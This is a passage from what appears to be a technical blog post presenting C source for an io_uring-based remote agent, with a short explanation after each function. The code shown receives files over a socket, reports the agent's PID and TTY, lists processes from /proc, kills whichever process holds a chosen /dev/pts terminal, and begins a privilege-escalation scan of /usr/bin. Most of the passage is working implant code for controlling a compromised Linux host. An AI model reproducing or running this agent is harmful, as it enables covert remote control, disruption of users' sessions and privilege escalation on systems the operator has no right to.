</span></span><span class="line"><span class="cl">        <span class="kt">size_t</span> <span class="n">to_read</span> <span class="o">=</span> <span class="p">(</span><span class="n">expected_size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">&gt;</span> <span class="n">BUF_SIZE</span><span class="p">)</span> <span class="o">?</span> <span class="nl">BUF_SIZE</span> <span class="p">:</span> <span class="p">(</span><span class="n">expected_size</span> <span class="o">-</span> <span class="n">offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_prep_recv</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">to_read</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">ssize_t</span> <span class="n">received</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">received</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_prep_write</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">received</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">+=</span> <span class="n">received</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>cmd_me</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_me</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">getpid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">tty</span> <span class="o">=</span> <span class="nf">ttyname</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tty</span><span class="p">)</span> <span class="n">tty</span> <span class="o">=</span> <span class="s">&#34;(none)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;PID: %d</span><span class="se">\n</span><span class="s">TTY: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">tty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.</p>
<p><code>cmd_ps</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_ps</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="s">&#34;/proc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="s">&#34;Failed to open /proc</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16384</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&#34;PID     CMD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">entry</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_type</span> <span class="o">!=</span> <span class="n">DT_DIR</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">endptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endptr</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">comm_path</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">comm_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm_path</span><span class="p">),</span> <span class="s">&#34;/proc/%ld/comm&#34;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">read_file_uring</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">comm_path</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">name</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&#34;%-7ld %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.</p>
<p><code>cmd_kick</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_kick</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">arg_raw</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">arg_raw</span><span class="p">)</span> <span class="n">arg_raw</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">arg</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">arg_raw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">trim_leading</span><span class="p">(</span><span class="o">&amp;</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strlen</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">DIR</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="s">&#34;/dev/pts&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">d</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">),</span> <span class="s">&#34;Failed to open /dev/pts: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">size_t</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&#34;Active pts sessions:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">((</span><span class="n">entry</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&#34;pts/%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">closedir</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">target_tty</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">target_tty</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">target_tty</span><span class="p">),</span> <span class="s">&#34;/dev/pts/%s&#34;</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">proc</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="s">&#34;/proc&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">),</span> <span class="s">&#34;Failed to open /proc: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">found_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">dent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">dent</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">proc</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">endptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">dent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endptr</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">fd_path</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">fd_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fd_path</span><span class="p">),</span> <span class="s">&#34;/proc/%ld/fd&#34;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">DIR</span> <span class="o">*</span><span class="n">fd_dir</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="n">fd_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fd_dir</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">fd_ent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">((</span><span class="n">fd_ent</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">fd_dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">fd_ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;.&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">link_path</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">link_target</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="kt">ssize_t</span> <span class="n">link_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nf">snprintf</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">link_path</span><span class="p">),</span> <span class="s">&#34;%s/%s&#34;</span><span class="p">,</span> <span class="n">fd_path</span><span class="p">,</span> <span class="n">fd_ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">link_len</span> <span class="o">=</span> <span class="nf">readlink</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="n">link_target</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">link_target</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">link_len</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">link_target</span><span class="p">[</span><span class="n">link_len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">link_target</span><span class="p">,</span> <span class="n">target_tty</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">found_pid</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">closedir</span><span class="p">(</span><span class="n">fd_dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">found_pid</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">closedir</span><span class="p">(</span><span class="n">proc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">found_pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">),</span> <span class="s">&#34;No process found using %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">target_tty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">kill</span><span class="p">(</span><span class="n">found_pid</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">),</span> <span class="s">&#34;Killed process %d using %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">found_pid</span><span class="p">,</span> <span class="n">target_tty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">),</span> <span class="s">&#34;Failed to kill process %d: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">found_pid</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.</p>
<p><code>cmd_privesc</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_privesc</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="s">&#34;/usr/bin&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="s">&#34;Failed to open /usr/bin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">23</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16384</span><span class="p">];</span>
